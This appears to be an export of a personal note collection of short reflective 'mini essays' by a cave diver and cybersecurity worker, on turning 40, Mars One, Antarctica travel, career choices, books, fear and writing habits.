For years now there’s been something drawing you to the quiet darkness of an otherwise empty forest outpost. There are critical elements to this interest though which are non-negotiable - it they’re not present, then the entire vibe is thrown off and it doesn’t work.

First and foremost is rain sounds. You knew the moment you heard the sounds of rain as the ship passed Saturn in Interstellar that it’s the sound that relaxes you most - the sounds that drowns out the other noise, any intrusive thoughts you might have, and never distracts you in itself. Right now you’ve got the Dark Forest Ambient Focus Music from YouTube on the other screen as you type, and the ambient synths are a fraction distracting… but the rain sounds that run underneath help make up for it.

item.title: Mini Essay - Appeal of living out of a van
item.description: One of the ideas that has stuck with me for decades now is the idea of living alone out of a van. I had the opportunity to do it when I went to Iceland in 2016, and it’s always stuck with me as a wonderful but slightly dislocated existence - like I knew I enjoyed having everything in my car and being free to go anywhere at any time, but not feeling like I could really stop anywhere either.

item.title: Mini Essay - Appeal of Small
item.description:
There’s something uniquely engaging about the world of the small. Whether it’s plastic WH40k miniatures, bonsai trees, LEGO, tilt-shift photography, ant colonies, model railways, or any one of a dozen other examples, there’s something that hooks the attention of many people in a way that the full scale version doesn’t.

Part of me thinks this may be a predominantly masculine trait, especially when I think things like toy soldiers and action figures, but then I only need to think of Barbie and Polly Pocket to realise that this particular focus on the world of the small isn’t really gendered - it’s just that we more often see men with hobbies that lend themselves to small things.

item.title: Mini Essay - Appeal of Thronglets
item.description: For some time I’ve wanted to rewatch the “Plaything” episode of Black Mirror with the express intent of zeroing in on why there’s so much appeal in an evolving digital sentience. On the surface the thronglets are terrifying - a digital lifeform that might be initially dismissed as an addictive game that’s hooked a vulnerable and emotionally overwhelmed man who took acid and became convinced the thronglets were talking to him, but they’re revealed at the end to be exactly as powerful and intelligent as he claimed when an audio signal rewrites the brains of everyone who hears it.

item.title: Mini Essay - April 19 (2023)
item.description:
Mini Essay - April 19 (2026)

I want to preface this by saying I wasn’t expecting to write it, and I’ve been working for the last few days on an entirely different and unrelated post about how I’m preparing for Mars One selection later this year. I’ll still publish that post in the next few days, but I’m not sure if I’ll publish this outside of Patreon. Maybe next year. Truth be told I may not publish this at all – all I know is I just realised what the date is, it stopped me in my tracks, and I need to write this right down while I’m feeling what I’m feeling.

item.title: Mini Essay - Before You're 40
item.description:
With just three months away, it’s suddenly becoming a big and urgent question of what you want to do before you’re 40, and more importantly what kind of life you want to live in your 40’s. You never really thought you’d make it to 30, and yet here you are nearly 10 years later wondering what you want to do next.

You 40s really need to be about embracing the life you want to live and reinforcing those things you love most. There’s no question you love writing books on your own, thinking deeply about difficult things, and sharing experiences with others who would never do see what you see without you. Your 40s should be about being bolder in the things you excel at, and cutting free the things that drag. All the philosophy you want to live by is already within you, already hashed out in your notes - now if the time to live it fully.

item.title: Mini Essay - Before You're 50
item.description: For the last few months since I turned 40, I’ve been trying to reassess my life and all the things I’ve done so far with limited success. Much of the challenge has come from knowing just how much there is to sort through and reframe, coupled with having ignored my writing for so long that it feels like there’s a kind of psychic constipation built-up - my recent writing is easing that pressure, but there is a whole lot clogged up that needs to be processed while still more builds up behind it.

item.title: Mini Essay - Choosing between potential jobs
item.description: Right now you’re looking at two different job opportunities, and both of them offer different elements of what you’re looking for in a career in cyber. It’s also important to remember that you don’t need either of these roles - they’re the first to come back to you, and they’ve both provided you with 2nd interviews today, but that doesn’t mean that either of them is the right fit for you - only that they’re the things that are being offered this week.

item.title: Mini Essay - Desires from work and a career in cyber
item.description: To determine what you want from work and your career in cybersecurity more generally, you really need to go back to why you got into cyber in the first place. This whole journey started because you were looking for work that was IT-related, because you haven’t never worked in IT have an aptitude for it. Your initial investigations were leading you down the Gaming pathway - that’s why you spoke to Martin about his work as much as you did, and why you bought a couple of cheap courses in modelling/gaming design in Unity. The interest in working with computers came first, and then the specialisation.

item.title: Mini Essay - Digital Garden
item.description:
First #mini-essay

While the internet has been overwhelmingly consumed with a “feed” or “stream” style where information and opinions are delivered as an unalterable fact, the early days of the internet were far more collaborative and interwoven.

The earliest web pages behaved much like a digital “garden” rather than a feed or chronological blog - posts and snippets of information being woven together in a dense tapestry that was always evolving and interlinking. While a feed provides the most recent and “important” content at the top, a digital garden provides a wide array of entry points and no two journey’s through it are the same. For the last 20 years the internet has evolved into a broad array of feeds all vying for the attention of visitors, delivering the latest and greatest at all times.

item.title: Mini Essay - Dune
item.description: For years now I’ve felt this overwhelming connection to the Dune universe, and in many ways that connection has felt as undefinable as the series itself. Some might refer to the “vibe” of Dune being appealing, but for me there’s something more than just enjoying the aesthetic - it’s the whole body understanding that if you stop moving, if you try to stay in one place, to put up defences, to block the flow of energy… then you’ll be destroyed and swept away regardless.

item.title: Mini Essay - Fear Is The Mind Killer
item.description:
“Fear is the mind killer” is the most easily recognised line from the “Litany Against Fear” from the Dune universe. Recited by high-born characters in times of high stress or when death threatens, it acts to centre and stabilise the emotions of those who recited it through the application of cold logic.

Accepting fear and allowing it to pass over you is vital to remaining in control when it could take control of your mind. In the universe of Dune, the litany is adopted as a vaccine to a digital virus that feeds on fear. However it’s origin can be traced back to Act II of Shakespeare’s Julius Caesar, in a quote which has been adapted numerous times - most notably paraphrased as “A coward dies a thousand deaths, but the brave die only once”.

item.title: Mini Essay - First Day in Ushuaia
item.description: It’s your first day in Ushuaia and you’re naturally shattered from not sleeping in the last 2.5 days, but you’re managing well considering that. You definitely got a good feel for this place though, enough that you certainly reached a point earlier where you were tired, hungry and sore, and the magic of being so close to Antarctica (with the matching weather) had worn off and you just wanted to stop.

item.title: Mini Essay - Greatest moments of joy in your life
item.description:
Ask yourself what the greatest moments of life have been in your life so far? There are a few that standout

  • Finishing the fireman’s carry for your fitness assessment to leave Hunter Company.
  • Turning around on the top of Uhuru Peak on Mt Kilimanjaro.
  • Seeing the Northern Lights through the windshield in Norway.
  • Popping out into the Garden in Englebrecht’s East.
  • Your first dive in Downstream Slot Cave.
  • Having a wombat try to steal Russ.
  • Being awarded the Golden Compass
  • Rescuing an echidna from L301
  • Finding downstream L301
  • Meeting Alex Alexakis in Adelaide
  • Passing my Security+
  • Passing my AZ-500
  • Finding the link between the White room and The Wedge Room in Pines
  • Looking through the One Tree swim-through for the first time
  • Your first breath underwater with a rebreather
  • Being selected for the Mars 100
  • Discovering Mars One
  • Diving Silfra
  • Setting fire to the koala suit
  • Holding a baby wombat on Flinders Island
  • The Becoming Martian book launch
  • Seeing the Lemurs at the Calgary Zoo
  • Joining the Ginger Pride parade in Melbourne
  • Seeing a Saturn V at Cape Canaveral
  • Watch Felix Baumgartner jump out of the Red Bull capsule
  • Eating a pie and drinking strawberry milk at the end of Ex Talisman Sabre

References

item.title: Mini Essay - Handwritten journal vs going digital
item.description: There’s no question that writing has played an absolutely vital role in your development since you first discovered Mars One in September 2012. It took awhile for you to figure out how you wanted to do this, but handwritten journals have formed the mainstay for more than a decade. In the last few years though, you’ve noticed your journaling drop right off, with regular gaps ever since 2020 and the COVID nightmare. You were working so hard on Cosmic Nomad that you poured out your heart and mind into that book, leaving no desire or need to then write by hand in a journal. And the reality is you’ve never really picked that up properly since.

item.title: Mini Essay - If Mars One rebooted
item.description: For some time you’ve been aware that the shutdown of Mars One in 2020 has left you very adrift and directionless in the world, and one of the questions that’s come up repeatedly is what you’d do if Mars One suddenly rebooted. Bas floated the idea when the Ridley Scott documentary was first being discussed, but we’ve heard nothing on that for well beyond the 12 month exclusivity contract. But the question remains - what would you do if Mars One rebooted tomorrow?

item.title: Mini Essay - If you had a year to live
item.description: If you knew you were going to die in a year, what would you do? Would you stay at work? Fuck no. Would you stay here with Chloe? Maybe, but only if it were to write as much as you possibly could with your final year. If you were going to die before you turned 41, there’s no question you’d travel and write constantly. And you certainly wouldn’t be diving in Mt Gambier - you’d be going straight to Spain to cave dive, maybe France for more of the same.

item.title: Mini Essay - Kids Meals on Planes
item.description:
Topic: Kids Meals on Planes

I’d never realised it before, but every meal on a plane is basically a kids meal. I’ve just visited my relentlessly obnoxious 3 year old nephew, and on the flight back to Adelaide I’ve been served focaccia topped with chorizo, pesto, bell peppers & goats cheese. Seems fancy as fuck, but looking at the box it was served in I realised it’s just like what you’d pull out of a Happy Meal. And that’s the trick, isn’t it? We’re being served little boxes of snacks to keep us happy as we fly through space in an aluminium tube full of recycled farts.

item.title: Mini Essay - Letter to Yourself in 5 Years
item.description:
Where do I want to be in 2031?

  • 46 years old
  • 8-10 years cyber experience (?)
  • 34 years diving, 12 years cave diving
  • Number of Books written?
  • Relationship to space exploration?
  • Speaking? TV?
  • Bucket List, Personal

This also reminds me of…

  • Website - Dear Josh in 2020

Tomorrow’s Mini Essay:

item.title: Mini Essay - MechWarrior
item.description:
There’s something really unique about my life-long relationship with the BattleTech / MechWarrior videogame series. The tabletop game look interesting too, but I’ve never really gone in for tabletop wargames except to paint them as models. But the videogames have always held a very special place in my heart, and it goes all the way back to my first exposure through MechWarrior 2.

Being able to stop around in such a huge bipedal robot and shoot things has to be a huge part of this. The idea of controlling a building size walking machine fitted with lasers and rockets is certainly awe inspiring, far more than I’d feel driving a tracked vehicle. In fact the tracked and flying vehicles in MechWarrior 5 often feel out of place when I see them in-game - more like a machine and less like a powerful giant.

item.title: Mini Essay - Mental Baggage
item.description: One of my ongoing challenges is keeping track of and managing all the different things that engage my attention. This can mean my Personal, asking Mini Essay - What are your obligations, my Work, and anything else that contacts my senses and hooks my attention. While I can track a wide range of interests and passions, the real challenge for me is task-switching: being invested in one thing, but needing to keep something else in mind at the same time, or being pulled away from my focus to handle some other issue.

item.title: Mini Essay - New Tattoo
item.description:
Getting a new tattoo has been a consideration for several years now, however there’s been some hesitation over what, where, and why.

The design that I’ve circled back to repeatedly is from the Zen Pencils comic for George Mallory’s “Because It’s There” quote, specifically from the cell where the Inventor is climbing with the text “We eat and make money to be able to live”. So much of what I’ve done for the last 15 years (and even earlier if I’m honest) has been about doing things that make me feel alive, and doing them regardless of whether other people understand the motivation.

item.title: Mini Essay - Not Fade Away (Jim Dodge)
item.description:
“Not Fade Away” turned out to be quite an interesting read after the initial confusion around the book by Ben Torres-Fong of the same name (accidentally read first before realising the author was different>. There’s no way I would have read it unless it had been on the 101 Things - Complete List list, but that’s the case with so many of those books anyway.

The narrative within a narrative was interesting, and was something that was easy to forget when I was in the thick of George’s story and not realising what I was reading was being told by George to someone else. Besides “Zen and the Art of Motorcycle Maintenance” I’ve not read an “on the road” book like it before, and a lot of it felt like going places just to go there, not to actually do anything. Even the idea of burning the Big Bopper’s car seemed arbitrary - it really was just about the journey in the end, and the people you meet along the way.

item.title: Mini Essay - November 23
item.description:
Related:

In early January 2010, I was on Dartmoor doing a survival exercise with the Royal Marine Commandos. I’d been training with them for a few months, and somewhere between the days of trudging through 6ft of soft snow and shivering through the -20°C nights, I was bitten by a deer tick. I didn’t know at the time that I’d been infected with Lymes disease, but 5 weeks later I was admitted to CTCRM’s hospital where I lost 8 kg in 5 days and nearly died.

item.title: Mini Essay - Now You're 40
item.description: Turning 40 hasn’t had any obvious impact on me so far, at least not in the way that turning 30 did as I discussed in Mini Essay - Why you didn’t think you’d make it to 30. I still joke about not living particularly long because of the stuff I do while cave diving, but the last 10 years haven’t had the same edge to them that the previous 10 did. As I’ve written elsewhere, I think being involved with Mars One made me think about where I’d be in 10 years time (eg. on my way to mars) rather than where I’d be when I turned a particular age.

item.title: Mini Essay - Organising a Mars One Analog
item.description:
An unexpected idea that appeared recently is to organise a Mars analog with a bunch of Mars One candidates in Wadi Rum. I’m not sure why something like this wasn’t organised previously, but the contact from DIrk through LinkedIn has triggered a cascade of ideas around a filmed Mars analogue featuring folks who volunteered for Mars One.

Thinking about it, it hasn’t taken much to put together a list of candidates to approach, or to pick a potential time to go - Jan/Feb 2027. There may be climate issues with a simulation in Wadi Rum then, but that’s all information you can research and put together before reaching out to potential analog astronauts. It’s also possible that 2027 is too soon, but I need to pick something to aim for, and it can always be adjusted later.

item.title: Mini Essay - Peaceful Warrior vs the Alchemist
item.description:
Having just finished two of the Peaceful Warrior books as well as the Alchemist, it feels like the perfect opportunity to compare and contrast the two in order to figure out what it is that makes them so special.

The stand out element from this most recent re-reading is that the Alchemist feels like an important reminder of the basics, whereas there are elements of the Peaceful Warrior series that seem new even though you’ve read it more than a dozen times. This time around rereading the Peaceful Warrior felt more important than the Alchemist, and I guess this is the opportunity to figure out why.

item.title: Mini Essay - Procrastinating Writing the Pines Article
item.description:
What’s the holdup on writing the article about your Crazy Wombat Tunnel discovery in Pines? You announced it all 2.5 months ago now, and yet you’ve never dedicated yourself to actually sitting down and writing something very important. Is this just procrastination, or is there something else here?

It’s easy to generate a list of excuses for not having done it yet - you’ve been sick, work has been full-on, you’ve been very focused on CISSP study, you’ve been dealing with the stress around Chloe wanting a home loan… is that it? It doesn’t feel like you’ve had many weekends to yourself, and the last weekend you had was dedicated to developing your Expedition plans (which you made excellent progress on).

item.title: Mini Essay - Ridiculous Bucket List
item.description: For the last few years I’ve had the idea of not just a bucket list, but a “ridiculous bucket list” - a list of things that seem utterly outrageous and infeasible, but the likes I would embrace in a heartbeat if the opportunity presented. While my bucket list includes things seeing an erupting volcano or joining the mile-high club, my ridiculous bucket list would have things like “Visit the Moon” and “Discover evidence for alien life on Mars”.

item.title: Mini Essay - Secret to dealing with work
item.description:
Related:

Surviving any uncomfortable workplace always requires an evil secret plan on your part, and your current situation is no different.

Your secret is that you’re using them as a stepping stone to more suitable work, and as a way to gain useful experience from both a corporate and technical perspective. From a technical perspective you’re now working in threat intelligence for a critical infrastructure organisation, which looks incredible on your resume. Being able to string those things together means you’re well on your way to choosing the kind of work you want in industries that you feel are important.

item.title: Mini Essay - Thoughts on 2025 Media
item.description:
Kindle

Not Fade Away (Jim Dodge) I have to laugh about this book because it’s on the 101 Things book list, but I accidentally read all of “Not Fade Away” by Ben Torres-Fong (about the early years of Rolling Stone) and didn’t realise I’d read the wrong book until I went to tick it off the list. I enjoyed both, but this one was certainly a lot weirder and more entertaining. It took me awhile to figure out that the journey was just an excuse to meet weird and wonderful characters along the way, but once I recognised that it was easy to settle in and see wherever the author decided to take it. Reading it wasn’t life changing, but it was certainly a fun read.

item.title: Mini Essay - Using my folding keyboard while flying from Melbourne to Santiago
item.description: I’ve just started my journey to Antarctica, or more accurately I’ve started the first overseas step to Antarctica with the flight from Melbourne to Santiago, and I’m getting used to working on the small Bluetooth keyboard I bought to avoid my laptop. This trip will be the first major test of this, not only learning to use a small form keyboard like this, but also the experience of travelling without a laptop - something I haven’t done since I left the marines.

item.title: Mini Essay - What are your obligations
item.description: As I put together the final things ready for the next few weeks in Antarctica and then Perth, I’m asking myself what my outstanding obligations are. This can be my emotional obligations (like people and things I feel I owe something to), physical obligations (like things that I have and feel responsible for), and my own spiritual obligations (the things that I feel I need to work on or do to feel fulfilled).

item.title: Mini Essay - What do you really want to do before you die
item.description: What do you really want to do before you die? It’s a tough question, and one that’s even tougher to contemplate. You’re 40 in a few months, which is wild considering you never thought you’d make it to 30. Now you talk about being lucky to make 70… maybe you need to ask yourself why you didn’t think you’d make it to 30, as well as what you’d do if you made it to 80 and have another 40 years of life ahead of you.

item.title: Mini Essay - What is fear to you
item.description:
This morning you spent a lot of time thinking during your walk about what fear means to you. There were a lot of examples, but actually pinning it down felt really hard, and much of that comes down to it being similar to distinctively different to anxiety.

For me, fear is cold followed by force. Fear is something you tend to run at, something you feel and immediately react to with action. Fear isn’t the every day concerns of things not working out or of something hypothetically happening - that’s anxiety. Fear is trying to hold a door closed as three sailors smash into it from the other side to kill you and rape the two women in the room with you. Fear is grabbing the fire extinguisher off the wall and breaking the toes in the foot jammed in the same door. Fear is holding onto a plastic sheet carrying a friend as they’re dying of hypothermia, as you run through the mud to get him into the back of an ambulance, then someone to help peel your fingers from the plastic because your hand has cramped onto it. Fear is going back to camp afterwards and finding two more, and knowing there’s no one left to help but you. Fear is talking your Mum through all the things she needs to put in a Go-Bag, because you’re sure that your father is going to try and kill her. Fear is begging her not to wait until he breaks in one night, to leave and get out now. Fear is him finding out where she’s been hiding, and having him threaten to fly across the country to kill her as well as my sister and her family too. Fear is knowing exactly what you’d to him do if he ever did.

item.title: Mini Essay - Where do I want to be in 2028
item.description:
There’s no denying that the last few months have been pretty turbulent, and I have a whole series of fairly significant life changes heading my way in the next month too. My perspective on life has massively shifted since turning 40 in August, leaving ElectraNet in September, and especially since Trip - Antarctica - 2025 Nov so it’s natural to look ahead and wonder where I’m trying to go next.

While everyone seems to put a lot of focus on turning 40, having drinks with Cairo last night reminded me that I’m still a massive Htchhikers Guide to the Galaxy nerd so I’ve always been more curious about what my life would look like at age 42. I’ll hit that milestone in August 2027, so I’m really curious about what my life is going to look like 4 months after that in 2028.

item.title: Mini Essay - Why Antarctica is Important to you
item.description:
As you sit in the airport at Buenos Aires after such a hefty few days of flying, it’s starting to really dawn on me that I’m about to flying to Ushuaia - the gateway to Antarctica. And in just a few days, I’ll be getting onboard an expedition ship Going to the Antarctic Peninsula!

There’s a big part of me that is simply not processing that fact - that in a few days I’ll be in Antarctica. I’m not sure if it’s the numbness you’ve experienced a lot of these last few years, but it’s not clear if my lack of excitement is because I haven’t come to terms with the reality of the trip yet, or if I’m downplaying it all in an attempt to protect my psyche from potential disappointment.

item.title: Mini Essay - Why I'm writing a book about cave diving
item.description: Writing a book about cave diving isn’t just the “right thing to do”, it’s also something I genuinely love the idea of doing. Writing is a huge part of my life and how I process things over time, and Diving is equally important to me having been part of my life for nearly 30 of my 40 years now. Cave diving is something that I’m fiercely passionate about and incredibly invested in, so it makes sense that I’d be drawn to the idea of combining these interests into writing a book about cave diving, especially if I put it in the context of my first 500 cave dives.

item.title: Mini Essay - Why it's easy to put off writing
item.description:
Related:

One of the challenges I routinely face is trying to prioritise writing as a regular practice. or as any kind of practice, regular or not. I know that I love writing, and even as I type this I can feel that sense of creation that I truly crave whenever I sit down and start typing out my thoughts on a keyboard - a particularly visceral experience where each click of the keyboard is another step towards an artistic expression that’s yearning to be shared.

item.title: Mini Essay - Why you didn't think you'd make it to 30
item.description: Throughout most of my 20’s I was certain I wouldn’t be alive to turn 30. It’s not like I can pinpoint exactly where that idea came from, but there’s no question it was a recurring belief that shaped the way I thought and planned my life. If I try to trace it back, I suspect I’ll wind up back at April 19th, 2008. I made a choice that night to live, and it was certainly a close-call, but I’ve used that night as a reference for most of my life since - no matter what awful shit I’ve been through since then, I know that I will never allow myself to be trapped in that mindset ever again, where suicide felt like the only way out.

item.title: Mini Essay - Your Cave Diving Future
item.description: Now that you’ve been suspended by the CDAA, you have an amazing opportunity to look ahead and ask what kind of future you want to have in cave diving. You knew the suspension was coming, and you’ve been more than emotionally ready to tackle it - part of you has even relished it finally coming to pass. So the question now is how you want to develop as an exploration cave diver outside of Mt Gambier and the CDAA.

item.title: Mini Essay - Your evil secret plan
item.description: Ask yourself “What is your evil secret plan?”. Ultimately this is a question about how you’re going to use the system to do the things that YOU want to do and live the life you want to live. We’re not talking about blindly trying to “Live your dreams” - we’re talking about gaming the system so it looks like you’re playing along with everyone else, but you’re hacking the game so you do exactly what you want regardless of what others may expect or even demand of you. So you’re not playing by any rules, but you are faking compliance while you put all the pieces into place to subvert expectations.

item.title: Mr Electrico - Ray Bradbury
item.description:
INTERVIEWER: That’s the character who makes a brief appearance in Something Wicked This Way Comes, right? And you’ve often spoken of a real-life Mr. Electrico, though no scholar has ever been able to confirm his existence. The story has taken on a kind of mythic stature—the director of the Center for Ray Bradbury Studies calls the search for Mr. Electrico the “Holy Grail” of Bradbury scholarship.

BRADBURY: Yes, but he was a real man. That was his real name. Circuses and carnivals were always passing through Illinois during my childhood and I was in love with their mystery. One autumn weekend in 1932, when I was twelve years old, the Dill Brothers Combined Shows came to town. One of the performers was Mr. Electrico. He sat in an electric chair. A stagehand pulled a switch and he was charged with fifty thousand volts of pure electricity. Lightning flashed in his eyes and his hair stood on end.

item.title: Murra El Elevyn - 6N47
item.description:
About

  • A ~300 m main tunnel links to two phreatic networks: one half-filled and one fully flooded. The NE passage (“60 m line”) departs the north side of a large rock; it’s classed Advanced Cave. Locally named Gary’s Back Passage and a “shortcut” from the entrance lake into the main tunnel are also treated as Advanced Cave for training. (cavedivers.com.au)

  • Walls show rich scalloping/phreatic morphologies; photographers consistently report very clear water with red-to-pink limestone tones. (lizrogersphotography.com)

Short piece of writing on some thing you find interesting All about retention, learning & reflection Write fast and often - over time it provides depth Mini-essays make learning more addictive by being novel Like a sketchbook for an artist

Three rules of Mini-essays

  1. Only cover one idea
  2. Keep them short (fit on monitor without scrolling)

Elements of mini-essay

  • 100-300 words (no scrolling within Obsidian, focus on being brief)

  • Write it as if you’re teaching it (Feynmann technique)

The Garden - the web as topology, web as space.

item.title: Notes - Too Many Interests
item.description:
Reference: https://youtu.be/lQFOeC3maeI?si=NVyRDJ759R7_Uhl2

Too Many Interests

You can’t follow your interests if you have no energy

  • Working all day, overstimulation,
  • Unfair to expect all to be able to come home and jump straight in
  • More about energy rather than time
    • How do you enjoy your hobby with a fresh mind and happy outlook
  • Save the heavy stuff for the morning when you’re fresh
    • Probably start to hate the hobby
    • Tired? Focus on relaxed aspects
    • Fresh? Focus on heavy
    • Split hobby elements into “Relaxing” and “Demanding”
  • Look at your energy levels and where you can give best (for me: Mornings)
  • Woodworking vs Camping - Split your hobbies into Relaxing vs Demanding
    • Woodworking you can roll straight into (Relaxing & Rejuvinating)
    • Camping requires more setup & investment (More Demanding)
  • Money
    • Must meet basic needs to fund hobbies
    • Expensive hobbies
    • Money can buy time to embrace hobbies
  • Take a break when you get home
    • Take half an hour to relax and disconnect from work
    • Get back in creative mood
    • Figure out how to have a better break
  • Carve out space for your hobbys/interests
    • Don’t be completely selfless
    • Express that it’s important to you, and an important part of who you are
  • Say no to some of your hobbies (or atleast say no to new ones)
    • The more you do, the more you dilute
    • Kill your darlings
    • Cut it down to 2-3 main hobbies - Intellectual, Physical, Social
  • Hobby Seasons
    • Focus hard on one hobby for several months, then steer away to something else
    • You’ll have muscle memory of the hobby (so you can come back)
    • You’re free to return to any hobby whenever you want
      • If you miss something after you stop, that’s important - you may stick with it your whole life
    • You can’t do everything
  • Busy with other priorities? Find ways to do a little of something you love
    • Let the big thing go, but find small ways to do it instead
    • Reduce the time
  • Quality over Quantity - focused practice
    • Have a plan, set goals, reflect after each session (+ buy quality with coaches)

Common Time Management
